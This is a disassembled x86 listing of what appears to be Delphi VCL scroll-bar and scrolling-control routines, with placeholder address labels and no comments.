mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_44a604
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_44a675
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44a5dc
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a67c
lea eax [ ebp - 0xc ]
call sub_403eac
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1fc
call sub_403864
sub_44a684
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c0
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_44a714
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413e5c
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_44afdc
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_44afbc
mov edx [ edi + 0xc ]
mov eax ebx
call sub_44ae6c
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a764
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44a91c
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_433ffc
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_44ae6c
xor edx edx
mov eax ebx
call sub_44ae6c
jmp r-xdata
sub_44a79c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4224d0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44a808
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4224d0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44a870
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_44afa4
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_436ea0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_44afa4
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_436e64
call sub_44a808
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_436e64
call sub_44a79c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_44a91c
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_43a170
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44a954
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43a170
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_44a988
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44a954
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44a954
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_44aa04
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43a170
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_44a988
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_433374
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_44a988
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4333b8
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44aa9c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43a170
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_44aafc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_44accd ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44aa04
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44aa04
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44ae6c
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
push ebp
call sub_44aa9c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
push ebp
call sub_44aa9c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406760
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44ae6c
jmp r-xdata
sub_44adf4
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44b4e4
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_44ae6c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_43a170
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_43a170
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_439d28
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_439d28
jmp r-xdata
call sub_44a5dc
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44af30
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44b4e4
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_44afe8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43a170
push eax
call sub_4240f0
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43a170
push eax
call sub_4240f0
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43a170
push eax
call sub_4240f0
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41c698
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43a170
push eax
call sub_4240f0
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43a170
push eax
call sub_4240f0
sub_44b0f0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44aa04
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_44aa04
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_44afe8
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43a170
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_44ae6c
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_44aa04
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_44b208
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_435e9c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a684
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a684
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_44b280
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4030f0
mov eax [ esi + 0x20c ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_435fc0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_44b2cc
push ebx
mov ebx eax
mov eax ebx
call sub_437128
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_44b4e4
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40b9f0
test al al
jne r-xdata
mov eax ebx
call sub_43a170
push eax
call sub_424124
sub_44b30c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b464
mov ecx edi
mov edx esi
mov eax ebx
call sub_436870
pop edi
pop esi
pop ebx
retn
sub_44b34c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b454
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_433374
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_44a91c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_436ea0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_44ae6c
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436e64
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436e64
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_413704
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4330e0
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b45b
mov eax [ ebp - 0x10 ]
call sub_4030f0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44a764
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_413860
xor ecx ecx
mov edx 0xb03e
call sub_434b3c
inc ebx
dec esi
jne r-xdata
sub_44b488
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_44afbc
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_44afbc
mov eax ebx
call sub_44b464
jmp r-xdata
sub_44b4e4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43a474
test al al
je r-xdata
xor eax eax
push ebp
push sub_44b5cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_44aa84
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44aa84
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_44b0f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_44b0f0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_44b0f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_44b0f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_44b0f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_44b0f0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_44b5f4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_433488
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4334b4
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_433488
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4334b4
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_433374
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44ae6c
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_433374
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_4333b8
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44ae6c
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_433374
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
